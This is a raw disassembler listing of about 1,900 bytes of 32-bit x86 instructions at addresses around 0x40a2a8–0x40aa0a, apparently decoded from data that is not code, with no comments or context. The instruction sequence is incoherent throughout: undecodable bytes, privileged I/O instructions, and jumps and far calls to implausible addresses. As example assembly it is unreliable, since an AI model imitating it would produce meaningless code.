  40a2a8:	pushf  
  40a2a9:	icebp  
  40a2aa:	adc    ebp,DWORD PTR [edi+0x1b]
  40a2ad:	gs xchg esi,eax
  40a2af:	jmp    0xb2b4:0xc79e5823
  40a2b6:	mov    dl,BYTE PTR [edx-0x4a]
  40a2b9:	sbb    eax,ebp
  40a2bb:	fstp   TBYTE PTR [eax-0x19]
  40a2be:	jb     0x40a2de
  40a2c0:	and    dl,dl
  40a2c2:	push   edi
  40a2c3:	mov    ds:0xf9586e26,eax
  40a2c8:	pop    esi
  40a2c9:	cli    
  40a2ca:	sub    al,0x69
  40a2cc:	or     esp,esi
  40a2ce:	ds jle 0x40a30a
  40a2d1:	in     eax,0xbf
  40a2d3:	adc    eax,0xaf83e971
  40a2d8:	push   edi
  40a2d9:	(bad)  
  40a2da:	jmp    0x40a261
  40a2dc:	adc    esp,DWORD PTR [esi+0x1eb06a41]
  40a2e2:	fnstenv [edx+0xd]
  40a2e5:	outs   dx,BYTE PTR ds:[esi]
  40a2e6:	xlat   BYTE PTR ds:[ebx]
  40a2e7:	cmp    eax,0xcdeb01c6
  40a2ec:	sub    eax,0x1dbeabce
  40a2f1:	ins    DWORD PTR es:[edi],dx
  40a2f2:	mov    ecx,0xbbae4b15
  40a2f7:	aad    0x6
  40a2f9:	je     0x40a319
  40a2fb:	mov    esi,0x6e767d7a
  40a300:	loop   0x40a2bf
  40a302:	mov    ch,0xa
  40a304:	stos   BYTE PTR es:[edi],al
  40a305:	xor    esp,edx
  40a307:	out    0x7c,eax
  40a309:	or     DWORD PTR [edi],edi
  40a30b:	inc    esp
  40a30c:	push   edx
  40a30d:	je     0x40a31e
  40a30f:	sbb    DWORD PTR [ebp-0x893c518],ecx
  40a315:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a317:	bnd jne 0x40a30f
  40a31a:	mov    edx,0x8682927a
  40a31f:	test   BYTE PTR [edi],ah
  40a321:	shr    BYTE PTR [ebx],cl
  40a323:	(bad)  
  40a324:	sbb    bh,BYTE PTR [eax+edx*1+0x2c4c7416]
  40a32b:	mov    esp,edi
  40a32d:	xor    dl,ch
  40a32f:	xchg   dl,cl
  40a331:	sub    eax,DWORD PTR [eax+0x4a]
  40a334:	push   ss
  40a335:	retf   
  40a336:	jbe    0x40a2f4
  40a338:	(bad)  
  40a339:	or     al,0xa
  40a33b:	in     eax,0x91
  40a33d:	icebp  
  40a33e:	fcom   QWORD PTR [esi]
  40a340:	xchg   edi,eax
  40a341:	sub    ebp,eax
  40a343:	xchg   edx,eax
  40a344:	and    BYTE PTR [edx+eiz*8+0x2184e185],bl
  40a34b:	mov    ch,0xc9
  40a34d:	jmp    DWORD PTR [ebx-0x61]
  40a350:	mov    ebp,0xac2841d3
  40a355:	inc    eax
  40a356:	xor    DWORD PTR [edi+0x1ee4e4ae],edi
  40a35c:	pop    eax
  40a35d:	jmp    FWORD PTR [eax+ebp*8]
  40a360:	pop    sp
  40a362:	out    dx,eax
  40a363:	mov    esp,0x5df7c9e
  40a368:	sbb    edi,ebp
  40a36a:	mov    eax,ebp
  40a36c:	mov    edx,0x9b8cb5b9
  40a371:	or     DWORD PTR [ecx+0x24502e63],esi
  40a377:	sub    al,0x1c
  40a379:	cmp    al,0x9
  40a37b:	cmp    DWORD PTR [ebp-0x66b47898],ecx
  40a381:	inc    esi
  40a382:	mov    dh,0xbe
  40a384:	xchg   DWORD PTR [esi+ebx*1],edx
  40a387:	je     0x40a3e5
  40a389:	xor    ch,dh
  40a38b:	mov    ah,0xa5
  40a38d:	fistp  DWORD PTR [esi+eax*2-0x4f6f8cc]
  40a394:	fwait
  40a395:	mov    eax,ds:0x8b7d4000
  40a39a:	test   eax,0xc4e31cfd
  40a39f:	push   cs
  40a3a0:	(bad)  
  40a3a1:	xor    edi,DWORD PTR [ebp+ecx*8-0x52]
  40a3a5:	lds    ecx,FWORD PTR [eax]
  40a3a7:	dec    esp
  40a3a8:	push   esi
  40a3a9:	(bad)
  40a3ac:	jmp    0x40a41f
  40a3ae:	lock mov bl,0x4
  40a3b1:	iret   
  40a3b2:	scas   eax,DWORD PTR es:[edi]
  40a3b3:	sub    eax,0x417991ba
  40a3b8:	das    
  40a3b9:	outs   dx,BYTE PTR ds:[esi]
  40a3ba:	das    
  40a3bb:	in     eax,0x65
  40a3bd:	test   DWORD PTR [ecx+0x0],ebx
  40a3c0:	ja     0x40a3a6
  40a3c2:	std    
  40a3c3:	ins    DWORD PTR es:[edi],dx
  40a3c4:	cmp    eax,0x5622812f
  40a3c9:	and    DWORD PTR [eax+ebp*4+0x185eb12a],esp
  40a3d0:	dec    ecx
  40a3d1:	lds    eax,FWORD PTR [ebx-0x468ff0f4]
  40a3d7:	add    dl,BYTE PTR [ebx+0x40]
  40a3da:	fiadd  WORD PTR ds:0x96ea7b82
  40a3e0:	cmp    eax,0xd49d781b
  40a3e5:	pop    ss
  40a3e6:	sub    eax,0x86d69214
  40a3eb:	jb     0x40a412
  40a3ed:	popa   
  40a3ee:	js     0x40a42a
  40a3f0:	lock push ebp
  40a3f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3f3:	retf   0x80e2
  40a3f6:	sbb    edx,DWORD PTR [ebx-0x13]
  40a3f9:	in     eax,dx
  40a3fa:	adc    BYTE PTR [ebx-0x7070c8f6],dh
  40a400:	aad    0xf8
  40a402:	shl    BYTE PTR [esi+esi*8],1
  40a405:	rcl    dh,cl
  40a407:	pop    esp
  40a408:	dec    eax
  40a409:	jge    0x40a405
  40a40b:	fmul   QWORD PTR [edi]
  40a40d:	int3   
  40a40e:	jae    0x40a3f1
  40a410:	push   ds
  40a411:	ja     0x40a420
  40a413:	xchg   edi,eax
  40a414:	cmp    DWORD PTR [edx-0x1b],esp
  40a417:	dec    esi
  40a418:	fstp   QWORD PTR [eax+0x4e]
  40a41b:	fcomp  DWORD PTR [ebp-0x110a0e79]
  40a421:	cmp    al,0xc7
  40a423:	jne    0x40a45b
  40a425:	jp     0x40a4a0
  40a427:	xchg   ecx,eax
  40a428:	push   ecx
  40a429:	dec    ebx
  40a42a:	ror    BYTE PTR [edi-0xf6c014a],0xe5
  40a431:	dec    ebp
  40a432:	test   bl,dh
  40a434:	aad    0xa2
  40a436:	fs xor dh,bl
  40a439:	pop    es
  40a43a:	pop    edx
  40a43b:	push   ss
  40a43c:	iret   
  40a43d:	push   ecx
  40a43e:	ror    BYTE PTR [ecx+0x7cde2f84],1
  40a444:	mov    al,ds:0xc518cffc
  40a449:	and    al,0x55
  40a44b:	ja     0x40a40a
  40a44d:	sti    
  40a44e:	xor    ch,bh
  40a450:	imul   ebp,DWORD PTR [edx],0x50
  40a453:	xchg   DWORD PTR ds:0xcce79f1b,ebx
  40a459:	int    0x2d
  40a45b:	jle    0x40a43e
  40a45d:	jp     0x40a404
  40a45f:	jo     0x40a3ff
  40a461:	jg     0x40a4ab
  40a463:	or     al,0xb7
  40a465:	sub    ch,BYTE PTR [esi-0x25]
  40a468:	(bad)  
  40a469:	adc    al,0xa4
  40a46b:	hlt    
  40a46c:	inc    eax
  40a46d:	inc    ebp
  40a46e:	out    0x94,eax
  40a470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a471:	cmp    DWORD PTR [edx],esi
  40a473:	xor    al,0xe9
  40a475:	dec    ecx
  40a476:	xchg   BYTE PTR cs:0xbcdc1c3c,ch
  40a47d:	sub    eax,edi
  40a47f:	loope  0x40a4d9
  40a481:	clc    
  40a482:	sbb    al,BYTE PTR [ebx-0x39a37ef2]
  40a488:	xchg   BYTE PTR [eax+0x5d63ef00],ah
  40a48e:	fild   QWORD PTR [eax]
  40a490:	lahf   
  40a491:	(bad)  
  40a492:	jns    0x40a475
  40a494:	in     eax,dx
  40a495:	sub    ah,BYTE PTR [ecx-0x4b]
  40a498:	mov    dh,0xa9
  40a49a:	xor    ch,BYTE PTR [edx-0x36be9936]
  40a4a0:	cmp    eax,0x5f6a7fec
  40a4a5:	rol    DWORD PTR [edx-0x3a],cl
  40a4a8:	jl     0x40a4e4
  40a4aa:	loope  0x40a47d
  40a4ac:	popf   
  40a4ad:	add    eax,0x4abcdff0
  40a4b2:	in     eax,dx
  40a4b3:	pop    ebp
  40a4b4:	add    DWORD PTR [esi],ecx
  40a4b6:	je     0x40a4f7
  40a4b8:	push   ss
  40a4b9:	inc    ebx
  40a4ba:	test   eax,0x48b2eb33
  40a4bf:	popf   
  40a4c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4c1:	pop    ebp
  40a4c2:	or     ecx,edi
  40a4c4:	add    al,0x39
  40a4c6:	rcr    DWORD PTR [ebx],0x45
  40a4c9:	sbb    bl,dl
  40a4cb:	fdiv   st(5),st
  40a4cd:	pushf  
  40a4ce:	das    
  40a4cf:	cld    
  40a4d0:	mov    dh,0x75
  40a4d2:	mov    edx,0x490a6bf6
  40a4d7:	mov    edi,0xe6c30c57
  40a4dc:	mov    bh,0x14
  40a4de:	or     al,0xa3
  40a4e0:	pop    ecx
  40a4e1:	repz or al,0xfe
  40a4e4:	jmp    0xd3b7732c
  40a4e9:	outs   dx,DWORD PTR ds:[esi]
  40a4ea:	int    0x5b
  40a4ec:	mov    DWORD PTR [esi-0x35],eax
  40a4ef:	cmp    eax,0xdd9e5f82
  40a4f4:	int    0xf1
  40a4f6:	loop   0x40a487
  40a4f8:	stos   BYTE PTR es:[edi],al
  40a4f9:	xor    eax,0xd6dbf792
  40a4fe:	add    BYTE PTR [ebx+eax*2],ch
  40a501:	jp     0x40a4ec
  40a503:	xlat   BYTE PTR ds:[ebx]
  40a504:	jbe    0x40a4a6
  40a506:	retf   
  40a507:	pushf  
  40a508:	xor    ch,BYTE PTR [ecx]
  40a50a:	cmp    BYTE PTR [esi],dl
  40a50c:	cwde   
  40a50d:	int    0xc8
  40a50f:	and    al,0x69
  40a511:	ins    BYTE PTR es:[edi],dx
  40a512:	ds inc ebx
  40a514:	popa   
  40a515:	or     DWORD PTR [ecx+edx*2],esp
  40a518:	adc    esp,DWORD PTR [ebp+0x4f]
  40a51b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a51c:	jl     0x40a524
  40a51e:	adc    BYTE PTR [ebp+eiz*8+0x75],dh
  40a522:	fnstsw WORD PTR [edx]
  40a524:	or     DWORD PTR [edi+edi*2+0x4a437804],ecx
  40a52b:	mov    ebx,esi
  40a52d:	or     BYTE PTR gs:[eax],dl
  40a530:	rcl    DWORD PTR [ecx],1
  40a532:	jl     0x40a59c
  40a534:	in     eax,dx
  40a535:	inc    edx
  40a536:	stc    
  40a537:	sti    
  40a538:	jae    0x40a4bf
  40a53a:	std    
  40a53b:	sub    BYTE PTR [edx+0x47],dl
  40a53e:	pop    ecx
  40a53f:	mov    ch,0x6
  40a541:	sbb    esp,DWORD PTR [edi-0x69594a57]
  40a547:	and    ah,BYTE PTR [eax]
  40a549:	add    DWORD PTR [ebx-0x496d731a],esp
  40a54f:	jp     0x40a522
  40a551:	(bad)  
  40a552:	aam    0xde
  40a554:	or     al,0xe
  40a556:	jl     0x40a514
  40a558:	add    al,0xcf
  40a55a:	ja     0x40a53d
  40a55c:	in     al,0x7
  40a55e:	push   edi
  40a55f:	daa    
  40a560:	mov    ah,0x15
  40a562:	xchg   edx,eax
  40a563:	je     0x40a5bc
  40a565:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a566:	stos   DWORD PTR es:[edi],eax
  40a567:	mov    edi,0x265ac16
  40a56c:	leave  
  40a56d:	push   esp
  40a56e:	xor    eax,0x96ea792a
  40a573:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a574:	xchg   esi,eax
  40a575:	jb     0x40a592
  40a577:	icebp  
  40a578:	(bad)  
  40a579:	pop    edx
  40a57a:	push   ss
  40a57b:	or     DWORD PTR [eax],edi
  40a57d:	adc    BYTE PTR [edx],ah
  40a57f:	scas   al,BYTE PTR es:[edi]
  40a580:	push   esp
  40a581:	retf   
  40a582:	cmp    al,0xae
  40a584:	(bad)  
  40a585:	mov    al,0x33
  40a587:	test   eax,eax
  40a589:	stc    
  40a58a:	dec    ebx
  40a58b:	mov    ecx,fs
  40a58d:	stc    
  40a58e:	leave  
  40a58f:	add    cl,BYTE PTR [ebp-0x34]
  40a592:	call   0xd13c:0x99cea376
  40a599:	imul   esp,DWORD PTR ds:0xd9e1d60b,0xb267ca27
  40a5a3:	pop    edx
  40a5a4:	fs cmp esi,edi
  40a5a7:	mov    ebp,0x6895fbe5
  40a5ac:	pop    edi
  40a5ad:	loope  0x40a553
  40a5af:	xor    eax,0xb733cff5
  40a5b4:	or     bh,BYTE PTR [ebx+0x2c]
  40a5b7:	and    edx,DWORD PTR ds:0xc26b2971
  40a5bd:	jle    0x40a5f8
  40a5bf:	push   0xfa531386
  40a5c4:	sar    BYTE PTR [edx-0x17],cl
  40a5c7:	xor    DWORD PTR [ecx+0x1b129ef7],0x2c
  40a5ce:	mov    cl,BYTE PTR [eax+0x25bf6833]
  40a5d4:	mov    al,ds:0x445a17e2
  40a5d9:	or     eax,0x5e78209
  40a5de:	ret    0xfe6e
  40a5e1:	xchg   BYTE PTR [ebx+0x3e],ah
  40a5e4:	push   edx
  40a5e5:	push   0xffffff9b
  40a5e7:	retf   0x5fcb
  40a5ea:	int    0xc3
  40a5ec:	adc    ebx,edx
  40a5ee:	mov    dl,0xca
  40a5f0:	je     0x40a5b3
  40a5f2:	push   0xfffffff7
  40a5f4:	push   cs
  40a5f5:	pushf  
  40a5f6:	sti    
  40a5f7:	es inc edi
  40a5f9:	gs sbb al,0xc9
  40a5fc:	out    dx,al
  40a5fd:	xor    BYTE PTR [esp+esi*1],ah
  40a600:	mov    ecx,0xad72a5c4
  40a605:	div    DWORD PTR [eax+0x29]
  40a608:	adc    dh,BYTE PTR [ebx-0x1f]
  40a60b:	add    DWORD PTR [esi+0x39],0xed7e82dc
  40a612:	test   eax,0xc325cda2
  40a617:	int3   
  40a618:	adc    BYTE PTR [esi],0x66
  40a61b:	mov    ebp,DWORD PTR [edx]
  40a61d:	mov    edi,0x6bd96462
  40a622:	xor    eax,0x8ee6d685
  40a627:	(bad)  
  40a628:	shr    ch,cl
  40a62a:	mov    cs,WORD PTR ss:[ebx+0x27d7c561]
  40a631:	cmp    BYTE PTR [edi+ebp*2-0x7e],dh
  40a635:	jmp    0x40a611
  40a637:	sbb    DWORD PTR [ebx-0x5a],esp
  40a63a:	xchg   esp,eax
  40a63b:	cmc    
  40a63c:	inc    edx
  40a63d:	std    
  40a63e:	(bad)  
  40a63f:	retf   0x8237
  40a642:	jbe    0x40a605
  40a644:	stos   BYTE PTR es:[edi],al
  40a645:	xchg   edx,eax
  40a646:	adc    BYTE PTR [edx+0x9],0x56
  40a64a:	ret    0x7e5a
  40a64d:	add    esp,DWORD PTR [esi]
  40a64f:	or     BYTE PTR [esi+0x7442ef77],dh
  40a655:	pop    ecx
  40a656:	pop    ecx
  40a657:	scas   al,BYTE PTR es:[edi]
  40a658:	bound  ebp,QWORD PTR [ebp-0x4c]
  40a65b:	jns    0x40a66b
  40a65d:	sbb    DWORD PTR [edi],edi
  40a65f:	fnstsw WORD PTR [esi+eiz*8+0x7]
  40a663:	jecxz  0x40a656
  40a665:	mov    al,BYTE PTR [ebx+0x1162ee69]
  40a66b:	ret    0x6338
  40a66e:	scas   eax,DWORD PTR es:[edi]
  40a66f:	xchg   ebp,eax
  40a670:	lea    eax,[edi]
  40a672:	cwde   
  40a673:	scas   al,BYTE PTR es:[edi]
  40a674:	aad    0x32
  40a676:	mov    edi,0x653fca67
  40a67b:	sub    eax,0xa69e02ae
  40a680:	sbb    cl,BYTE PTR [edx-0x2291c55d]
  40a686:	mov    ecx,0xd1969bed
  40a68b:	or     edx,DWORD PTR [esi+0x6c]
  40a68e:	add    BYTE PTR [ecx-0x418138cb],ah
  40a694:	pop    es
  40a695:	pop    edx
  40a696:	popf   
  40a697:	or     eax,0xb0233316
  40a69c:	nop
  40a69d:	cmp    ah,BYTE PTR [eax]
  40a69f:	xchg   cl,ah
  40a6a1:	out    dx,al
  40a6a2:	popa   
  40a6a3:	inc    edx
  40a6a4:	ror    esp,0x33
  40a6a7:	xchg   ebp,eax
  40a6a8:	cwde   
  40a6a9:	in     al,dx
  40a6aa:	pop    esp
  40a6ab:	mov    ebp,0x6d1d4a91
  40a6b0:	out    0x8b,al
  40a6b2:	sti    
  40a6b3:	or     al,0xc7
  40a6b5:	xor    BYTE PTR [ebp-0x1bcd5aed],bl
  40a6bb:	out    0x49,eax
  40a6bd:	mov    BYTE PTR [ecx+0x37],ch
  40a6c0:	sbb    BYTE PTR [ecx+0x17e61de],ah
  40a6c6:	retf   0x21ee
  40a6c9:	enter  0xe405,0x11
  40a6cd:	xor    BYTE PTR [ecx],0x46
  40a6d0:	shl    BYTE PTR ss:[eax-0x2c],cl
  40a6d4:	addr16 daa 
  40a6d6:	push   ebx
  40a6d7:	jge    0x40a6be
  40a6d9:	ret    
  40a6da:	push   esi
  40a6db:	pop    es
  40a6dc:	pushf  
  40a6dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6de:	inc    edi
  40a6df:	cli    
  40a6e0:	xor    edx,DWORD PTR [edi-0x46]
  40a6e3:	sub    eax,0x14ae94eb
  40a6e8:	pop    esi
  40a6e9:	dec    edi
  40a6ea:	mov    DWORD PTR [edi-0x4d5ab79f],edi
  40a6f0:	pop    eax
  40a6f1:	ins    DWORD PTR es:[edi],dx
  40a6f2:	pushf  
  40a6f3:	in     al,dx
  40a6f4:	inc    edi
  40a6f5:	ins    BYTE PTR es:[edi],dx
  40a6f6:	add    dl,bh
  40a6f8:	stos   DWORD PTR es:[edi],eax
  40a6f9:	dec    esi
  40a6fa:	repnz xor dl,BYTE PTR ds:[ecx]
  40a6fe:	cld    
  40a6ff:	or     eax,0x18b5b82d
  40a704:	std    
  40a705:	push   esp
  40a706:	push   ecx
  40a707:	cmp    al,0x57
  40a709:	mov    esi,0x9dffc3a5
  40a70e:	sysret 
  40a710:	jb     0x40a701
  40a712:	fimul  WORD PTR [esi]
  40a714:	adc    dh,BYTE PTR [ecx]
  40a716:	out    dx,eax
  40a717:	sbb    ebp,ebx
  40a719:	jmp    0x40a726
  40a71b:	push   0x87c3ac5f
  40a720:	out    0xb9,al
  40a722:	pop    ss
  40a723:	add    dh,bh
  40a725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a726:	xchg   edx,eax
  40a727:	rol    DWORD PTR [ecx+0x6e48f043],1
  40a72d:	retf   
  40a72e:	repz push eax
  40a730:	jle    0x40a78d
  40a732:	dec    ebp
  40a733:	bsr    eax,DWORD PTR [ecx-0x6d11c254]
  40a73a:	aaa    
  40a73b:	and    DWORD PTR [edi],esi
  40a73d:	dec    ecx
  40a73e:	les    ecx,FWORD PTR [edx-0x345a3101]
  40a744:	sub    al,0xe5
  40a746:	ja     0x40a732
  40a748:	pop    ss
  40a749:	mov    edi,0x76716a49
  40a74e:	push   ebp
  40a74f:	int    0x8
  40a751:	daa    
  40a752:	mov    esi,0x46c482dc
  40a757:	or     al,0xb8
  40a759:	mov    al,ds:0x17b871cd
  40a75e:	push   0xffffff8a
  40a760:	adc    cl,BYTE PTR ds:0xb2394073
  40a766:	and    esi,DWORD PTR ds:0x975bd926
  40a76c:	aas    
  40a76d:	cdq    
  40a76e:	std    
  40a76f:	pop    ecx
  40a770:	sub    esi,DWORD PTR [ecx]
  40a772:	btc    DWORD PTR [edx+0xc92dc85],edx
  40a779:	ror    BYTE PTR [ecx-0x1e],1
  40a77c:	into   
  40a77d:	inc    edx
  40a77e:	jmp    0x40a772
  40a780:	sbb    eax,0x557995ee
  40a785:	cmp    DWORD PTR [esi-0x4f],ebp
  40a788:	pop    edi
  40a789:	je     0x40a7ef
  40a78b:	leave  
  40a78c:	and    esi,DWORD PTR [ebx]
  40a78e:	js     0x40a7a0
  40a790:	xor    edx,DWORD PTR ds:0x349d1f6d
  40a796:	pop    esi
  40a797:	(bad)  
  40a799:	das    
  40a79a:	inc    edx
  40a79b:	mov    dl,0xdc
  40a79d:	int    0x9
  40a79f:	xchg   ecx,eax
  40a7a0:	shr    DWORD PTR [ebx-0x29],0x19
  40a7a4:	cmp    eax,0x66e65a77
  40a7a9:	into   
  40a7aa:	gs stc 
  40a7ac:	cdq    
  40a7ad:	nop
  40a7ae:	mov    dh,0xa6
  40a7b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7b1:	fadd   st,st(2)
  40a7b3:	dec    edi
  40a7b4:	mov    bh,0x9e
  40a7b6:	test   BYTE PTR [ebx],0xce
  40a7b9:	out    0x68,eax
  40a7bb:	cmp    dh,BYTE PTR [edx+0x47]
  40a7be:	adc    eax,0xde6d112
  40a7c3:	xor    eax,0xf3056465
  40a7c8:	fs jns 0x40a845
  40a7cb:	daa    
  40a7cc:	xchg   ebx,eax
  40a7cd:	das    
  40a7ce:	scas   eax,DWORD PTR es:[edi]
  40a7cf:	je     0x40a7a6
  40a7d1:	pop    edx
  40a7d2:	outs   dx,BYTE PTR ds:[esi]
  40a7d3:	lea    esp,[ecx-0x26a6ef77]
  40a7d9:	xchg   ecx,eax
  40a7da:	mov    ah,0x1
  40a7dc:	pop    ebp
  40a7dd:	pop    esp
  40a7de:	pop    ds
  40a7df:	xchg   esi,eax
  40a7e0:	fwait
  40a7e1:	popf   
  40a7e2:	ficomp DWORD PTR [esi+eiz*2]
  40a7e5:	push   es
  40a7e6:	fbstp  TBYTE PTR [edi-0x479bf076]
  40a7ec:	jl     0x40a790
  40a7ee:	cmp    eax,0x12f37da1
  40a7f3:	adc    ecx,DWORD PTR ds:0x58b7630b
  40a7f9:	ret    
  40a7fa:	in     eax,dx
  40a7fb:	clc    
  40a7fc:	or     DWORD PTR [eax+0x63b6d454],0xf826884a
  40a806:	inc    edx
  40a807:	scas   eax,DWORD PTR es:[edi]
  40a808:	cdq    
  40a809:	mov    esp,ecx
  40a80b:	mov    al,ds:0xc4e250a2
  40a810:	aam    0x94
  40a812:	repz xchg esi,eax
  40a814:	add    eax,0xc55300be
  40a819:	enter  0x499d,0xe1
  40a81d:	dec    esi
  40a81e:	std    
  40a81f:	or     al,0x93
  40a821:	lds    edi,FWORD PTR [eax+0x1f0c0fc5]
  40a827:	jb     0x40a7d0
  40a829:	sbb    BYTE PTR cs:[ebx],bh
  40a82c:	add    ebp,eax
  40a82e:	sbb    bh,cl
  40a830:	xchg   esi,eax
  40a831:	xchg   esi,eax
  40a832:	repnz repnz add edx,0xd78c1164
  40a83a:	dec    ebp
  40a83b:	push   edi
  40a83c:	xor    edi,DWORD PTR [ecx+0x78]
  40a83f:	mov    al,ds:0x78a41c7c
  40a844:	pushf  
  40a845:	pusha  
  40a846:	outs   dx,BYTE PTR ds:[esi]
  40a847:	lods   al,BYTE PTR ds:[esi]
  40a848:	je     0x40a841
  40a84a:	stc    
  40a84b:	js     0x40a82b
  40a84d:	les    edi,FWORD PTR [eax+0x75]
  40a850:	outs   dx,DWORD PTR ds:[esi]
  40a851:	jge    0x40a7ff
  40a853:	push   esp
  40a854:	retf   
  40a855:	mov    cl,0x80
  40a857:	push   esi
  40a858:	mov    dl,0x69
  40a85a:	push   eax
  40a85b:	pushf  
  40a85c:	shl    cl,cl
  40a85e:	(bad)  
  40a85f:	(bad)  
  40a860:	or     al,0xfb
  40a862:	add    BYTE PTR [edi+0x66efae0],al
  40a868:	leave  
  40a869:	std    
  40a86a:	xchg   DWORD PTR [eax],edi
  40a86c:	out    dx,eax
  40a86d:	or     BYTE PTR [edx+0x637402a4],al
  40a873:	lods   al,BYTE PTR ds:[esi]
  40a874:	outs   dx,DWORD PTR ds:[esi]
  40a875:	fisubr WORD PTR [ecx+edx*8+0x6a6e78a9]
  40a87c:	xchg   ebp,eax
  40a87d:	inc    edx
  40a87e:	fisttp DWORD PTR [edi+0x719c5187]
  40a884:	mov    esp,0xe5ad5dfd
  40a889:	test   ebx,0xa32291d2
  40a88f:	add    dl,BYTE PTR [eax-0x1ba3e84]
  40a895:	in     al,0x8b
  40a897:	outs   dx,BYTE PTR ds:[esi]
  40a898:	sub    al,BYTE PTR es:[ebp+0x740b0adf]
  40a89f:	outs   dx,DWORD PTR ds:[esi]
  40a8a0:	push   edi
  40a8a1:	cmp    al,al
  40a8a3:	mov    esp,0x36d578ba
  40a8a8:	add    ch,BYTE PTR ds:0x2259ec38
  40a8ae:	in     eax,dx
  40a8af:	sub    BYTE PTR [edx+0x16],bh
  40a8b2:	pop    edi
  40a8b3:	xchg   ecx,eax
  40a8b4:	int3   
  40a8b5:	xor    eax,0xd098dc1a
  40a8ba:	or     edi,DWORD PTR ss:0x229e7d18
  40a8c1:	in     al,0x7c
  40a8c3:	dec    edx
  40a8c4:	xchg   DWORD PTR [ecx+0x6dfbe096],edx
  40a8ca:	out    dx,eax
  40a8cb:	jns    0x40a8c8
  40a8cd:	cmp    edi,0x2e28650a
  40a8d3:	pop    edi
  40a8d4:	xor    eax,0x2405aa70
  40a8d9:	inc    esp
  40a8da:	test   BYTE PTR [eax],bl
  40a8dc:	dec    esi
  40a8dd:	sbb    BYTE PTR [esi+0x73],ah
  40a8e0:	jmp    0x60fdece
  40a8e5:	jno    0x40a947
  40a8e7:	add    bl,bl
  40a8e9:	retf   0xa182
  40a8ec:	jo     0x40a871
  40a8ee:	arpl   WORD PTR [edx-0x1e],si
  40a8f1:	shl    BYTE PTR ds:0x825fbf01,1
  40a8f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8f8:	mov    ecx,0x6f8dcd2e
  40a8fd:	std    
  40a8fe:	adc    ebx,ecx
  40a900:	lahf   
  40a901:	je     0x40a8bb
  40a903:	lds    ecx,FWORD PTR [esp+ecx*2+0x3d]
  40a907:	out    0x3e,eax
  40a909:	out    dx,al
  40a90a:	sub    al,0x24
  40a90c:	shl    BYTE PTR [eax+0x49744c59],0x3b
  40a913:	pushf  
  40a914:	push   es
  40a915:	pop    ds
  40a916:	push   es
  40a917:	(bad)  
  40a918:	and    bh,bh
  40a91a:	lock jnp 0x40a8f5
  40a91d:	sub    eax,edx
  40a91f:	and    BYTE PTR [eax-0x15700c18],bh
  40a925:	int    0x21
  40a927:	mov    ebx,0xf2e0774c
  40a92c:	jmp    0x3bae0948
  40a931:	cmp    BYTE PTR [esi],ah
  40a933:	mov    eax,0x6667547c
  40a938:	sahf   
  40a939:	add    eax,0x43675fb9
  40a93e:	test   al,0x4f
  40a940:	addr16 cmp eax,0x3a8401b2
  40a946:	adc    al,0xfb
  40a948:	lods   al,BYTE PTR ds:[esi]
  40a949:	cmp    al,0x3a
  40a94b:	or     eax,0x81eab20a
  40a950:	xchg   BYTE PTR [edx-0x2a3c480c],ah
  40a956:	outs   dx,DWORD PTR ds:[esi]
  40a957:	and    dl,BYTE PTR [eax+0x6972e641]
  40a95d:	je     0x40a91a
  40a95f:	push   0x59
  40a961:	xchg   ebx,eax
  40a962:	sbb    al,0xc9
  40a964:	sar    eax,1
  40a966:	jmp    0x554a905a
  40a96b:	jge    0x40a9eb
  40a96d:	test   eax,0x2afd26ed
  40a972:	aam    0x2d
  40a974:	or     eax,0xd5263a
  40a979:	shl    BYTE PTR [edi],0x50
  40a97c:	or     ebx,DWORD PTR [edi+0x2a]
  40a97f:	push   esi
  40a980:	scas   al,BYTE PTR es:[di]
  40a982:	stc    
  40a983:	or     eax,0x80c9962
  40a988:	mov    bl,BYTE PTR [ecx+0x14]
  40a98b:	sbb    DWORD PTR [esi],0x66227aca
  40a991:	jge    0x40a96c
  40a993:	out    0x7c,eax
  40a995:	lods   eax,DWORD PTR ds:[esi]
  40a996:	jbe    0x40a9e4
  40a998:	sahf   
  40a999:	jmp    0x40a9f8
  40a99b:	adc    al,0x79
  40a99d:	xor    DWORD PTR [ebp-0x28ef05bd],eax
  40a9a3:	pusha  
  40a9a4:	inc    edx
  40a9a5:	jo     0x40a9ae
  40a9a7:	xchg   edx,eax
  40a9a8:	test   BYTE PTR [ecx],al
  40a9aa:	jno    0x40a96f
  40a9ac:	adc    DWORD PTR [ecx+0x3dac1c6c],ebp
  40a9b2:	jge    0x40a944
  40a9b4:	xor    eax,0xa24a2723
  40a9b9:	adc    DWORD PTR [esi+edi*4+0x55],ebp
  40a9bd:	gs pop ds
  40a9bf:	mov    edi,0xc143f952
  40a9c4:	ins    DWORD PTR es:[edi],dx
  40a9c5:	adc    dl,BYTE PTR [ecx+eiz*1+0x62]
  40a9c9:	jmp    0xb58a:0xc081fc80
  40a9d0:	mov    ebx,0x4b62f9b8
  40a9d5:	xlat   BYTE PTR ds:[ebx]
  40a9d6:	(bad)  
  40a9d8:	add    dl,cl
  40a9da:	xor    BYTE PTR [esi+0x5c],ah
  40a9dd:	test   DWORD PTR [ebx],ebx
  40a9df:	jnp    0x40aa2b
  40a9e1:	addr16 inc edx
  40a9e3:	bound  ecx,QWORD PTR [edx+0x24]
  40a9e6:	daa    
  40a9e7:	inc    esi
  40a9e8:	xchg   ebx,eax
  40a9e9:	aas    
  40a9ea:	inc    edi
  40a9eb:	lds    ecx,FWORD PTR [edi-0x18]
  40a9ee:	inc    esi
  40a9ef:	pop    ebx
  40a9f0:	fcomp  st(0)
  40a9f2:	sbb    DWORD PTR [ebp+edi*8+0x16],0xfffffff4
  40a9f7:	test   bl,ch
  40a9f9:	pop    ecx
  40a9fa:	sbb    DWORD PTR [ebx+0xafa3185],esp
  40aa00:	inc    ebp
  40aa01:	aaa    
  40aa02:	xor    BYTE PTR [ebp+ebx*4+0x1d979be0],al
  40aa09:	in     eax,dx
  40aa0a:	sbb    eax,ebp
